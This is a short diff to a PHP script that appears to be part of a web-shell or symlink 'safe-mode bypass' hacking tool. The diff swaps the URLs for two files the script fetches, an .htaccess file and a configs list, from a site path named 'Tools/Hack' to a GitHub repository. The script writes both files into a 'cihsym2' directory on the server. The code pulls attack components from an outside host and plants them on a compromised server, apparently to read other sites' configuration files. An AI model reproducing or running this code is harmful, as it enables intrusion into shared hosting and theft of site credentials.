@@ -17,7 +17,7 @@ if($dir){
     echo "<br> [-] Error !";
 }
 
-    $htaccess = "http://cih-iq.org/Tools/Hack/shCiH/htaccess";
+    $htaccess = "https://raw.githubusercontent.com/CiH777/safe-mode/master/htaccess";
     $file = file_get_contents($htaccess);
     $open = fopen("cihsym2/.htaccess" , 'w');
     fwrite($open,$file);
@@ -28,7 +28,7 @@ if($dir){
          echo "<br>[-] Error !";
      }
 
-    $cof = "http://cih-iq.org/Tools/Hack/shCiH/configs.txt";
+    $cof = "https://raw.githubusercontent.com/CiH777/safe-mode/master/configs";
     $file = file_get_contents($cof);
     $open = fopen("cihsym2/sym2.cih" , 'w');
     fwrite($open,$file);
